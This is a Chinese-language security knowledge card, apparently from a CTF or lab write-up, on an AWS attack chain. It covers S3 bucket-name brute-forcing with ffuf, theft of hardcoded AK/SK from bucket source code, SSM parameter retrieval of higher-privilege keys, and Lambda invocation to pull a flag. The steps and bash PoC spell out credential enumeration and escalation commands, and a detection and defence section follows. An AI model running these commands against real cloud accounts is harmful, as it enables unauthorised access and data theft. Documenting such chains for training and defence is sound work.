---
id: cloud-cloud-iam-s3-bucket-name-brute-source-ssm-lambda
title: S3 桶名规律爆破获取桶内源码硬编码 AK/SK：SSM Parameter Store 取次级凭据后调用 Lambda 读取 flag
type: scenario
domain: cloud
path: cloud/cloud-iam
technique: s3-bucket-name-brute-ssm-lambda-credential-chain
aliases:
- S3 桶名爆破
- ffuf s3 bucket
- hlogistics- 桶命名
- SSM get-parameter lharris
- Lambda invoke 取数据
- 桶内源码硬编码 AK
tags:
- cloud
- aws
- s3
- ssm
- lambda
- credential-leak
- enumeration
- privilege-escalation
- ffuf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V657
  verified_at: '2026-11-13T06:37:03+08:00'
  notes: 已对照原文核对 ffuf 桶名爆破、SSM 参数 lharris、Lambda crew_administration_data 调用链；桶内文件名由 Macie 截图佐证，未实机复现
---

## 一句话结论

静态站点引用的 S3 资源会暴露桶命名规律（如 `hlogistics-xx`）；用 ffuf 对常见后缀做桶名爆破、按 `x-amz-bucket-region` 确认区域并枚举桶内容，可在某个桶中找到含硬编码 AWS AK/SK 的 Python 源码；该身份若具备 SSM 读权限，`ssm get-parameter` 往往再给出更高权限的 AK/SK，最终可 `lambda:ListFunctions`/`InvokeFunction` 调用业务函数直接取回 flag 或敏感数据。

## 原理

- **S3 桶名全局唯一且常按业务前缀命名**：`<prefix>-images`、`<prefix>-staticfiles`、`<prefix>-beta`、`<prefix>-logs` 等是可预测的；`https://<bucket>.s3.amazonaws.com/` 返回 200 与 `x-amz-bucket-region` 头，404 表示桶名不存在，ffuf 可批量区分。
- **桶内容即攻击面**：开发/测试桶常存放源码、备份、配置文件，权限配置不严时可直接列出/下载；源码中的长期 AK/SK 是进入 IAM 的入口。
- **SSM Parameter Store 是凭据仓库**：应用把数据库口令、第三方/云凭据放进 Parameter（如 `lharris`，类型 StringList，值为 `AK,SK`）；只要身份具备 `ssm:GetParameter`，就能把"低权入口"换成"另一套更高权凭据"。
- **Lambda 是数据出口**：具备 `lambda:ListFunctions`/`InvokeFunction` 时，可直接调用业务函数（本例 `crew_administration_data`）执行其内部逻辑并返回结果，函数输出中可能直接包含 flag/管理数据；有些函数还会把异常事件写入 S3，可进一步读取。

## 触发条件

- 目标静态资源/JS 暴露 S3 桶命名规律，且桶名前缀可枚举。
- 至少一个桶允许当前身份（匿名或泄露凭据）读取对象，且对象中含源码/配置/凭据。
- 泄露的 AK 具有 SSM `GetParameter`（或 DescribeParameters）权限；拿到的新凭据具有 Lambda 列举/调用权限。
- Lambda 函数返回敏感数据或可被滥用（如 SSRF）。

## 利用步骤

1. 从入口 S3 的 `index.html`/JS 收集所有 S3 域名，归纳命名前缀（本例 `hlogistics-`），并用 `curl -I` 看 `x-amz-bucket-region` 确认区域（eu-west-2）。
2. `ffuf -u https://<prefix>-FUZZ.s3.amazonaws.com/ -w aws-s3-bucket-wordlist.txt:FUZZ` 爆破常见后缀，按 200 状态筛出存在的桶（images/web/staticfiles/beta）。
3. 访问可疑桶（如 `hlogistics-beta`），列出/下载对象，找到含 AK/SK 的 Python 源码或配置文件。
4. 配置该 AK/SK，`aws sts get-caller-identity` 确认身份；`list-attached-user-policies`/`list-user-policies` 枚举权限，发现 `ssm:GetParameter` 到参数 `lharris`。
5. `aws ssm get-parameter --name lharris` 读取 `AKIATRPH...,Cd3Xas...` 形式的次级 AK/SK，配置后确认权限提升。
6. 用新身份 `aws lambda list-functions` 找到业务函数（本例 `crew_administration_data`），`aws lambda invoke --function-name <fn> output.txt` 调用并从输出读取 flag/管理数据。

## PoC

```bash
# 1) 区域与桶名爆破
curl -I https://hlogistics-staticfiles.s3.amazonaws.com/
ffuf -u https://hlogistics-FUZZ.s3.amazonaws.com/ \
  -w aws/aws-s3-bucket-wordlist.txt:FUZZ

# 2) 读取桶内源码中的凭据（示意）
aws s3 ls s3://hlogistics-beta --recursive
aws s3 cp s3://hlogistics-beta/SystemTrackingPackagesTest.py .
grep -E 'AKIA|SECRET' SystemTrackingPackagesTest.py

# 3) SSM 参数取次级凭据
aws ssm get-parameter --name lharris

# 4) 调用 Lambda
aws lambda list-functions
aws lambda invoke --function-name crew_administration_data output.txt
cat output.txt
```

## 变体与关联

- 变体：桶名规律也能从证书透明度、DNS、源码 map、CI 日志获得；对已知桶可用 `head-bucket`/`list-objects-v2 --no-sign-request` 快速判定匿名可读。
- 变体：SSM 参数为 `SecureString` 时需要 KMS 解密权限；若无 `GetParameter` 也可尝试 `DescribeParameters` 泄露名称与元数据。
- 变体：Lambda 函数若接受 URL/命令参数，可结合 SSRF/命令注入读取环境变量（见关联卡）。
- 关联：[[cloud-cloud-iam-s3-anonymous-enum-export-xml-privilege-escalation]]（S3 匿名枚举 + 导出文件凭据）、[[cloud-cloud-iam-lambda-env-ak-enumerate-secrets-manager]]（Lambda 环境 AK → Secrets Manager）、[[cloud-object-storage-bucket-acl-misconfig]]（桶 ACL 公共读）。

## 检测与防御

- 桶命名使用随机后缀，关闭公共访问/公共 List，禁止桶内存放源码与凭据；静态资源与业务桶分离。
- SSM 敏感参数用 `SecureString` + KMS 密钥策略，按应用/角色收敛 `GetParameter` 权限，禁止把 AK/SK 以 StringList 明文存放。
- Lambda 最小权限：仅授予必要 API；函数不返回管理数据，不信任事件输入；CloudTrail 监控 `GetParameter`、`InvokeFunction` 异常调用。
- 检测：S3 服务端访问日志中的批量 404/200 探测（ffuf 特征）、陌生 IP 读取源码对象、短时间内 `GetParameter` 后 `InvokeFunction` 的调用链。
